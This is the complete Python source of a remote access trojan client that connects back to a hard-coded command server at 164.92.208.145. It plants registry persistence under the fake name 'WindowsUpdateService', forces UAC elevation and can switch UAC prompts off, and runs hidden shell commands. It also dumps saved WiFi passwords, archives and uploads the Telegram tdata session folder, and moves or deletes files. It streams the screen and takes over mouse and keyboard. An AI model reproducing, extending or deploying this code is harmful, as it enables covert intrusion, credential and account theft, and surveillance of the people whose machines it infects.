import socket
import subprocess
import os
import sys
import time
import threading
from mss import mss
from PIL import Image
import io
import shutil
import getpass
import pathlib
import traceback
import base64
import json
from pynput.mouse import Button, Controller as MouseController
from pynput.keyboard import Key, Controller as KeyboardController

# --- Imports for Windows Specifics ---
try:
    import win32gui
    import win32ui
    import win32con
    import win32api
    import ctypes
    from ctypes import wintypes
    import winreg
    IS_WINDOWS = True
except ImportError:
    IS_WINDOWS = False
# ----------------------------------

# --- Configuration ---
SERVER_IP = "164.92.208.145"
PORT = 3131
# ---------------------

# --- Globals for Streaming ---
stream_thread = None
control_thread = None
stop_stream_event = None
ACTIVE_UPLOADS = {}
# -----------------------------

if IS_WINDOWS:
    class ShellExecuteInfoW(ctypes.Structure):
        _fields_ = [
            ("cbSize", wintypes.DWORD),
            ("fMask", ctypes.c_ulong),
            ("hwnd", wintypes.HWND),
            ("lpVerb", wintypes.LPCWSTR),
            ("lpFile", wintypes.LPCWSTR),
            ("lpParameters", wintypes.LPCWSTR),
            ("lpDirectory", wintypes.LPCWSTR),
            ("nShow", ctypes.c_int),
            ("hInstApp", wintypes.HINSTANCE),
            ("lpIDList", ctypes.c_void_p),
            ("lpClass", wintypes.LPCWSTR),
            ("hkeyClass", wintypes.HKEY),
            ("dwHotKey", wintypes.DWORD),
            ("hIcon", wintypes.HANDLE),
            ("hProcess", wintypes.HANDLE),
        ]

HEADER_LENGTH = 10

def setup_persistence():
    """Establishes persistence via Windows Registry."""
    if sys.platform == "win32":
        try:
            import winreg
            # Path to the executable
            exe_path = os.path.realpath(sys.executable)
            
            # Registry key to modify
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "WindowsUpdateService" # Disguised name

            # Open the key
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'"{exe_path}"')
        except (ImportError, OSError):
            # Failed to set persistence (e.g., permissions issue or not on Windows)
            pass # Fail silently

def send_json(sock, data):
    """Serializes data to JSON, prefixes with a header, and sends."""
    try:
        message = json.dumps(data)
        message_bytes = message.encode('utf-8')
        header = f"{len(message_bytes):<{HEADER_LENGTH}}".encode('utf-8')
        sock.sendall(header + message_bytes)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def send_frame(sock, frame_bytes, monitor_index):
    """Sends a frame with a monitor index and a length header."""
    try:
        header = f"{len(frame_bytes):<{HEADER_LENGTH}}".encode('utf-8')
        # Use 1 byte for monitor index, allowing up to 256 monitors
        monitor_header = monitor_index.to_bytes(1, 'big')
        sock.sendall(monitor_header + header + frame_bytes)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def receive_json(sock):
    """Receives a JSON message with a fixed-size header."""
    try:
        header = sock.recv(HEADER_LENGTH)
        if not header:
            return None
        message_length = int(header.decode('utf-8').strip())
        
        chunks = []
        bytes_recd = 0
        while bytes_recd < message_length:
            chunk = sock.recv(min(message_length - bytes_recd, 4096))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_recd += len(chunk)
        
        return json.loads(b''.join(chunks).decode('utf-8'))
    except (ValueError, ConnectionResetError, BrokenPipeError, json.JSONDecodeError):
        return None

def capture_cursor():
    """
    Captures the mouse cursor image and its position using Windows APIs.
    Returns a PIL Image of the cursor and its (x, y) screen coordinates.
    """
    if not IS_WINDOWS:
        return None, None

    try:
        # Get cursor information
        flags, hcursor, (x, y) = win32gui.GetCursorInfo()

        # If the cursor is not showing, don't draw it
        if flags != win32con.CURSOR_SHOWING:
            return None, None

        # Get icon info to find the hotspot and bitmaps
        icon_info = win32gui.GetIconInfo(hcursor)
        x_hotspot, y_hotspot = icon_info[1], icon_info[2]

        # Create a device context (DC) for drawing
        hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
        hbmp = win32ui.CreateBitmap()
        
        # Get cursor dimensions for compatibility
        cursor_w = win32api.GetSystemMetrics(win32con.SM_CXCURSOR)
        cursor_h = win32api.GetSystemMetrics(win32con.SM_CYCURSOR)

        hbmp.CreateCompatibleBitmap(hdc, cursor_w, cursor_h)
        hdc_mem = hdc.CreateCompatibleDC()
        hdc_mem.SelectObject(hbmp)

        # Draw the cursor onto the bitmap
        hdc_mem.DrawIcon((0, 0), hcursor)

        # Get the bitmap bits and convert to a PIL Image with alpha channel
        bmp_str = hbmp.GetBitmapBits(True)
        cursor_img = Image.frombuffer(
            'RGBA',
            (cursor_w, cursor_h),
            bmp_str, 'raw', 'BGRA', 0, 1
        )

        # Clean up GDI objects
        win32gui.DeleteObject(icon_info[3]) # hbmMask
        win32gui.DeleteObject(icon_info[4]) # hbmColor
        hdc_mem.DeleteDC()
        win32gui.DeleteObject(hbmp.GetHandle())
        hdc.DeleteDC()

        # Calculate top-left position for pasting
        paste_x = x - x_hotspot
        paste_y = y - y_hotspot

        return cursor_img, (paste_x, paste_y)
    except Exception:
        # Fail silently if any WinAPI call fails
        return None, None

def is_admin():
    """Checks for administrative privileges."""
    if not IS_WINDOWS:
        return False
    try:
        # A non-zero result indicates the user is an administrator.
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        # shell32 might not be available or IsUserAnAdmin might not exist.
        return False

def attempt_elevation():
    """Attempts to re-launch the current script with admin privileges via UAC."""
    if not IS_WINDOWS:
        return "FAILURE:NOT_WINDOWS"

    SEE_MASK_NOCLOSEPROCESS = 0x00000040
    SW_SHOW = 5 # SW_SHOWNORMAL

    shell32 = ctypes.windll.shell32
    
    sei = ShellExecuteInfoW()
    sei.cbSize = ctypes.sizeof(sei)
    sei.fMask = SEE_MASK_NOCLOSEPROCESS
    sei.hwnd = None
    sei.lpVerb = "runas"
    sei.lpFile = sys.executable
    # Pass a dedicated argument to the new elevated process to avoid conflicting with persistence setup.
    sei.lpParameters = "--elevated"
    sei.lpDirectory = None
    sei.nShow = SW_SHOW

    try:
        if shell32.ShellExecuteExW(ctypes.byref(sei)):
            ctypes.windll.kernel32.CloseHandle(sei.hProcess)
            return "SUCCESS"
        else:
            error_code = ctypes.windll.kernel32.GetLastError()
            # Error 1223: The operation was canceled by the user.
            return f"FAILURE:{error_code}"
    except Exception as e:
        return f"FAILURE:EXCEPTION_{e.__class__.__name__}"

class FileSystemManager:
    def __init__(self, main_sock):
        self.main_sock = main_sock

    def _validate_path(self, path_str):
        """Allows absolute paths and resolves them safely."""
        try:
            # Directly resolve the provided path. This allows for "C:/Users" etc.
            # It will resolve relative paths against the CWD, which is fine.
            # The key is not forcing it to be a child of the CWD.
            resolved_path = pathlib.Path(path_str).resolve()
            return resolved_path
        except Exception:
            return None

    def list_directory(self, path_str):
        """Lists contents of a directory."""
        safe_path = self._validate_path(path_str)
        if not safe_path or not safe_path.exists():
            return {"status": "error", "message": "Path not found or invalid."}
        if not safe_path.is_dir():
            return {"status": "error", "message": "Path is not a directory."}

        contents = []
        try:
            for item in os.scandir(safe_path):
                try:
                    stat = item.stat()
                    contents.append({
                        "name": item.name,
                        "type": "dir" if item.is_dir() else "file",
                        "size": stat.st_size,
                        "modified": stat.st_mtime
                    })
                except OSError:
                    continue # Skip inaccessible files
            return {"status": "success", "data": {"path": str(safe_path), "contents": contents}}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def list_drives(self):
        """Lists all system drives."""
        if not IS_WINDOWS:
            return {"status": "success", "data": {"drives": ["/"]}}
        
        drives = []
        try:
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                if bitmask & 1:
                    drives.append(f"{letter}:\\")
                bitmask >>= 1
            return {"status": "success", "data": {"drives": drives}}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def start_file_download(self, path_str):
        """Reads a file in chunks and sends it over the main socket."""
        safe_path = self._validate_path(path_str)
        if not safe_path or not safe_path.is_file():
            send_json(self.main_sock, {"type": "fs_response", "status": "error", "message": "File not found."})
            return

        try:
            with open(safe_path, 'rb') as f:
                seq = 0
                while chunk := f.read(3072): # 3KB chunks to fit in 4KB after base64
                    encoded_chunk = base64.b64encode(chunk).decode('ascii')
                    if not send_json(self.main_sock, {"type": "fs_chunk", "payload": {"path": str(safe_path), "data": encoded_chunk, "seq": seq}}):
                        return # Connection lost
                    seq += 1
            send_json(self.main_sock, {"type": "fs_get_end", "payload": {"path": str(safe_path)}})
        except Exception as e:
            send_json(self.main_sock, {"type": "fs_response", "status": "error", "message": str(e)})

    def start_file_upload(self, path_str):
        """Prepares to receive a file."""
        safe_path = self._validate_path(path_str)
        if not safe_path:
            return {"status": "error", "message": "Invalid path."}
        
        try:
            # Open file for writing and store the handle
            file_handle = open(safe_path, 'wb')
            ACTIVE_UPLOADS[str(safe_path)] = file_handle
            return {"status": "success", "message": "Ready to receive file."}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def write_file_chunk(self, path_str, data_b64):
        """Writes a chunk of data to an open file handle."""
        safe_path = self._validate_path(path_str)
        if not safe_path:
            return
        key = str(safe_path)
        if key not in ACTIVE_UPLOADS:
            return
        try:
            data = base64.b64decode(data_b64)
            ACTIVE_UPLOADS[key].write(data)
        except Exception:
            # Error during write, clean up
            self.finish_file_upload(path_str)

    def finish_file_upload(self, path_str):
        """Closes the file handle for a completed upload."""
        safe_path = self._validate_path(path_str)
        if not safe_path:
            return {"status": "error", "message": "Invalid path."}
        key = str(safe_path)
        if key in ACTIVE_UPLOADS:
            ACTIVE_UPLOADS[key].close()
            del ACTIVE_UPLOADS[key]
            return {"status": "success", "message": "File uploaded successfully."}
        return {"status": "error", "message": "No active upload found for that path."}

    def delete_path(self, path_str):
        safe_path = self._validate_path(path_str)
        if not safe_path or not safe_path.exists():
            return {"status": "error", "message": "Path not found."}
        try:
            if safe_path.is_dir():
                shutil.rmtree(safe_path)
            else:
                os.remove(safe_path)
            return {"status": "success", "message": f"Deleted: {safe_path}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def create_directory(self, path_str):
        safe_path = self._validate_path(path_str)
        if not safe_path:
            return {"status": "error", "message": "Invalid path."}
        try:
            os.makedirs(safe_path, exist_ok=True)
            return {"status": "success", "message": f"Created directory: {safe_path}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

class ControlHandler(threading.Thread):
    def __init__(self, server_ip, port, stop_event):
        super().__init__()
        self.server_ip = server_ip
        self.port = port
        self.stop_event = stop_event
        self.daemon = True
        self.mouse = MouseController()
        self.keyboard = KeyboardController()
        # Get screen dimensions for scaling
        with mss() as sct:
            monitor = sct.monitors[0] # The entire virtual screen
            self.screen_width = monitor["width"]
            self.screen_height = monitor["height"]

    def run(self):
        control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            control_socket.connect((self.server_ip, self.port))
            # Use a file-like object for easier reading of line-based JSON
            f = control_socket.makefile('r')
            while not self.stop_event.is_set():
                line = f.readline()
                if not line:
                    break # Admin disconnected
                
                try:
                    event = json.loads(line)
                    self.process_event(event)
                except (json.JSONDecodeError, KeyError):
                    continue # Ignore malformed data
        except Exception:
            # Admin likely closed the window, or connection failed
            pass
        finally:
            control_socket.close()
            self.stop_event.set() # Signal other threads (like streamer) to stop

    def process_event(self, event):
        event_type = event.get("type")
        if event_type == "mousemove":
            x = int(event['x'] * self.screen_width)
            y = int(event['y'] * self.screen_height)
            self.mouse.position = (x, y)
        elif event_type == "mousedown":
            button = self.get_button(event['button'])
            if button: self.mouse.press(button)
        elif event_type == "mouseup":
            button = self.get_button(event['button'])
            if button: self.mouse.release(button)
        elif event_type == "scroll":
            self.mouse.scroll(event['dx'], event['dy'])
        elif event_type == "keydown":
            key = self.get_key(event['key'])
            self.keyboard.press(key)
        elif event_type == "keyup":
            key = self.get_key(event['key'])
            self.keyboard.release(key)

    def get_button(self, button_str):
        return {'left': Button.left, 'right': Button.right, 'middle': Button.middle}.get(button_str)

    def get_key(self, key_str):
        return getattr(Key, key_str, key_str)

class Streamer(threading.Thread):
    def __init__(self, server_ip, port, fps, quality, capture_cursor, stop_event):
        super().__init__()
        self.server_ip = server_ip
        self.port = port
        self.fps = fps
        self.quality = quality
        self.capture_cursor = capture_cursor
        self.stop_event = stop_event
        self.daemon = True

    def run(self):
        with mss() as sct:
            data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                data_socket.connect((self.server_ip, self.port))
            except Exception:
                # Server might have closed the listener before we could connect
                return

            try:
                while not self.stop_event.is_set():
                    start_time = time.time()
                    
                    # sct.monitors[0] is all screens combined, [1:] are individual monitors
                    for i, monitor in enumerate(sct.monitors[1:]):
                        sct_img = sct.grab(monitor)
                        
                        # Convert BGRA to RGB for Pillow
                        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                        
                        # --- Cursor Overlay Logic ---
                        if self.capture_cursor:
                            cursor_img, cursor_pos = capture_cursor()
                            if cursor_img and cursor_pos:
                                # Calculate position relative to the current monitor
                                relative_x = cursor_pos[0] - monitor['left']
                                relative_y = cursor_pos[1] - monitor['top']
                                
                                # Paste cursor onto the screenshot, using its alpha channel as a mask
                                img.paste(cursor_img, (relative_x, relative_y), cursor_img)
                        
                        # Compress to JPEG in memory
                        with io.BytesIO() as buffer:
                            img.save(buffer, format="JPEG", quality=self.quality)
                            frame_bytes = buffer.getvalue()
                        
                        if not send_frame(data_socket, frame_bytes, i):
                            self.stop_event.set() # Signal loop to stop
                            break
                    
                    # Frame rate limiting
                    elapsed_time = time.time() - start_time
                    sleep_time = (1.0 / self.fps) - elapsed_time
                    if sleep_time > 0:
                        time.sleep(sleep_time)
            finally:
                data_socket.close()

def handle_tdata_upload(host, port, token, main_sock):
    """Finds, archives, and uploads the Telegram tdata folder."""
    try:
        # 1. Find tdata path
        def send_status(message):
            send_json(main_sock, {"type": "task_status", "task": "tg", "message": message})

        appdata = os.getenv('APPDATA')
        if not appdata:
            send_status("ERROR: APPDATA environment variable not found.")
            return
        
        tdata_path = pathlib.Path(appdata) / "Telegram Desktop" / "tdata"
        if not tdata_path.is_dir():
            send_status("NOT_FOUND: Telegram tdata directory not found.")
            return

        # 2. Archive the folder
        send_status(f"FOUND: Found tdata at {tdata_path}. Archiving...")
        username = getpass.getuser().replace(" ", "_")
        # Create archive in a temporary location to avoid permission issues
        temp_dir = os.getenv('TEMP', '.')
        archive_base_name = pathlib.Path(temp_dir) / f"tdata_{username}"
        
        try:
            archive_path = shutil.make_archive(
                base_name=str(archive_base_name),
                format='zip',
                root_dir=str(tdata_path.parent),
                base_dir='tdata'
            )
        except Exception as e:
            send_status(f"ERROR: Failed to archive tdata: {e}")
            return

        # 3. Upload the archive
        send_status(f"ARCHIVED: Archive created. Uploading {os.path.getsize(archive_path) / (1024*1024):.2f} MB...")
        
        for attempt in range(3): # Retry loop
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as upload_sock:
                    upload_sock.connect((host, port))
                    
                    # Authenticate and send username for filename
                    auth_message = f"AUTH {token} {username}\n".encode('utf-8')
                    upload_sock.sendall(auth_message)
                    
                    response = upload_sock.recv(1024).decode('utf-8')
                    if "200 OK" not in response:
                        raise ConnectionAbortedError(f"Server rejected upload: {response.strip()}")

                    with open(archive_path, 'rb') as f:
                        while chunk := f.read(4096):
                            upload_sock.sendall(chunk)
                
                send_status("COMPLETE: Upload successful.")
                break # Exit retry loop on success
            except Exception as e:
                if attempt == 2: # Last attempt failed
                    send_status(f"ERROR: Upload failed after 3 attempts: {e}")
    except Exception as e:
        tb = traceback.format_exc()
        send_status(f"CRITICAL_ERROR: An unexpected error occurred: {e}\n{tb}")
    finally:
        # 4. Cleanup
        if 'archive_path' in locals() and os.path.exists(archive_path):
            os.remove(archive_path)


def run_silent_command(command):
    """Executes a command without showing a console window (Windows)."""
    startupinfo = None
    creationflags = 0
    if sys.platform == "win32":
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        creationflags = subprocess.CREATE_NO_WINDOW
    
    proc = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        startupinfo=startupinfo,
        creationflags=creationflags
    )
    return (proc.stdout + proc.stderr).decode('utf-8', errors='ignore')

def get_network_details():
    """Retrieves saved WiFi profiles and passwords using netsh."""
    # 1. Get current SSID
    current_ssid = ""
    try:
        interfaces_output = run_silent_command("netsh wlan show interfaces")
        for line in interfaces_output.split('\n'):
            if "SSID" in line and ":" in line:
                # Find the first SSID line that has a value
                ssid_val = line.split(":", 1)[1].strip()
                if ssid_val:
                    current_ssid = ssid_val
                    break
    except Exception:
        pass # Ignore if it fails, we just won't know the current network

    # 2. Get all profiles
    profiles_output = run_silent_command("netsh wlan show profiles")
    profile_names = []
    for line in profiles_output.split('\n'):
        if "All User Profile" in line:
            profile_names.append(line.split(":", 1)[1].strip())

    # 3. Iterate and get keys
    results = ["SSID|Password|Connected", "------------------------------"]
    for profile in profile_names:
        password = "[Requires Admin]"
        try:
            profile_output = run_silent_command(f'netsh wlan show profile name="{profile}" key=clear')
            for line in profile_output.split('\n'):
                if "Key Content" in line:
                    password = line.split(":", 1)[1].strip()
                    break
        except Exception:
            password = "[Error Parsing]"
        is_connected = "yes" if profile == current_ssid else "no"
        results.append(f"{profile}|{password}|{is_connected}")
    
    if len(results) == 2: # Only header was added
        return "[!] No WiFi profiles found."
    return "\n".join(results)

def get_uac_status():
    """Reads the registry to determine the current UAC status."""
    if not IS_WINDOWS:
        return 'NOT_APPLICABLE'

    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ) as key:
            consent_prompt = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")[0]
            secure_desktop = winreg.QueryValueEx(key, "PromptOnSecureDesktop")[0]
            
            # Default enabled values
            if consent_prompt == 5 and secure_desktop == 1:
                return 'ENABLED'
            # Disabled values
            elif consent_prompt == 0 and secure_desktop == 0:
                return 'DISABLED'
            else:
                return 'UNKNOWN' # Custom setting
    except FileNotFoundError:
        # If the key or values don't exist, UAC is likely at its default (enabled) state.
        return 'ENABLED'
    except OSError:
        return 'ERROR_READING'

def set_uac_status(enable: bool):
    """Modifies registry keys to enable or disable UAC."""
    if not IS_WINDOWS:
        return 'NOT_APPLICABLE'

    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
            if enable:
                # Set to Windows default "Notify me only when apps try to make changes to my computer"
                winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 5)
                winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 1)
                return "SUCCESS_ENABLED"
            else:
                # Set to "Never Notify"
                winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
                return "SUCCESS_DISABLED"
    except PermissionError:
        return "ERROR_PERMS"
    except OSError:
        return "ERROR_UNKNOWN"

def connect_to_server():
    """Main connection loop with retry logic."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, PORT))
            return s
        except socket.error:
            time.sleep(5) # Wait 5 seconds before retrying

def main():
    # Declare all managed global threads at the top of the function scope
    # to avoid SyntaxError during parsing.
    global stream_thread, control_thread, stop_stream_event

    # --- Conditional Privilege Elevation ---
    if IS_WINDOWS:
        # Aggressively attempt to elevate if not already running as admin.
        if not is_admin():
            result = attempt_elevation()
            if result == "SUCCESS":
                # The new elevated process will start, so this one must exit.
                os._exit(0)
    # ----------------------------------------------------

    # If --startup is passed, this is a one-time action to set up persistence.
    # The process should exit afterward, not proceed to connect.
    if "--startup" in sys.argv:
        setup_persistence()
        return

    sock = connect_to_server()

    # Send initial handshake message
    init_data = {
        "username": getpass.getuser(),
        "is_admin": is_admin(),
        "uac_status": get_uac_status()
    }
    send_json(sock, {"type": "init", "data": init_data})

    fs_manager = FileSystemManager(sock)

    while True:
        request = receive_json(sock)
        
        if request is None:
            sock.close()
            sock = connect_to_server()
            # Re-send handshake after reconnecting
            send_json(sock, {"type": "init", "data": init_data})
            continue

        action = request.get("action")
        payload = request.get("payload", {})

        if action == "exec":
            cmd = payload
            if cmd.lower().startswith('cd '):
                try:
                    path = cmd.strip().split(' ', 1)[1]
                    os.chdir(path)
                    output = f"Changed directory to {os.getcwd()}\n"
                except Exception as e:
                    output = str(e) + "\n"
            else:
                output = run_silent_command(cmd)
                if not output.strip():
                    output = "[No output]\n"
            send_json(sock, {"type": "response", "data": output})

        elif action == "get_network_info":
            output = get_network_details()
            send_json(sock, {"type": "response", "data": output})

        elif action == "uac":
            level = payload.get("level")
            result = set_uac_status(enable=(level == 'enable'))
            send_json(sock, {"type": "uac_response", "status": "success" if "SUCCESS" in result else "error", "detail": result})

        elif action == "su":
            result = attempt_elevation()
            send_json(sock, {"type": "su_response", "status": "success" if result == "SUCCESS" else "failure", "detail": result})
            if result == "SUCCESS":
                time.sleep(1)
                os._exit(0)

        # --- File System Actions ---
        elif action == "fs_list":
            response = fs_manager.list_directory(payload.get("path"))
            send_json(sock, {"type": "fs_response", **response})

        elif action == "fs_list_drives":
            response = fs_manager.list_drives()
            send_json(sock, {"type": "fs_drives_response", **response})
        
        elif action == "fs_get_start":
            # This is a streaming action, runs in a thread to not block main loop
            threading.Thread(target=fs_manager.start_file_download, args=(payload.get("path"),), daemon=True).start()

        elif action == "fs_put_start":
            response = fs_manager.start_file_upload(payload.get("path"))
            send_json(sock, {"type": "fs_response", "original_action": "fs_put_start", **response})

        elif action == "fs_put_chunk":
            fs_manager.write_file_chunk(payload.get("path"), payload.get("data"))

        elif action == "fs_put_end":
            response = fs_manager.finish_file_upload(payload.get("path"))
            send_json(sock, {"type": "fs_response", "original_action": "fs_put_end", **response})

        elif action == "fs_delete":
            response = fs_manager.delete_path(payload.get("path"))
            send_json(sock, {"type": "fs_response", "original_action": "fs_delete", **response})

        elif action == "fs_mkdir":
            response = fs_manager.create_directory(payload.get("path"))
            send_json(sock, {"type": "fs_response", "original_action": "fs_mkdir", **response})

        # Other fs actions can be added here following the same pattern
        # For now, this covers the core functionality of browsing and downloading.

        elif action == "watch_start":
            try:
                ip = payload.get("ip")
                port = payload.get("port")
                fps = payload.get("fps", 30)
                quality = payload.get("quality", 70)
                capture_cursor = payload.get("capture_cursor", True)
                
                if stream_thread and stream_thread.is_alive():
                    continue # Already streaming

                stop_stream_event = threading.Event()
                stream_thread = Streamer(ip, port, fps, quality, capture_cursor, stop_stream_event)
                stream_thread.start()
            except Exception:
                pass # Ignore malformed command

        elif action == "control_start":
            try:
                ip = payload.get("ip")
                stream_port = payload.get("stream_port")
                control_port = payload.get("control_port")

                if (stream_thread and stream_thread.is_alive()) or \
                   (control_thread and control_thread.is_alive()):
                    continue # Already in a session

                stop_stream_event = threading.Event()
                # Use default params for stream, as they aren't passed for control
                stream_thread = Streamer(ip, stream_port, 30, 70, True, stop_stream_event)
                control_thread = ControlHandler(ip, control_port, stop_stream_event)
                
                stream_thread.start()
                control_thread.start()
            except Exception:
                pass # Ignore malformed command

        elif action == "watch_stop":
            if stop_stream_event:
                stop_stream_event.set()
            if stream_thread:
                stream_thread.join(timeout=2)
            if control_thread:
                control_thread.join(timeout=2)
            stream_thread, control_thread, stop_stream_event = None, None, None

        elif action == "initiate_tdata_upload":
            try:
                host = payload.get("host")
                port = payload.get("port")
                token = payload.get("token")
                # Run in a thread to avoid blocking the main command loop
                threading.Thread(target=handle_tdata_upload, args=(host, port, token, sock), daemon=True).start()
            except Exception:
                pass # Ignore malformed command

if __name__ == "__main__":
    main()

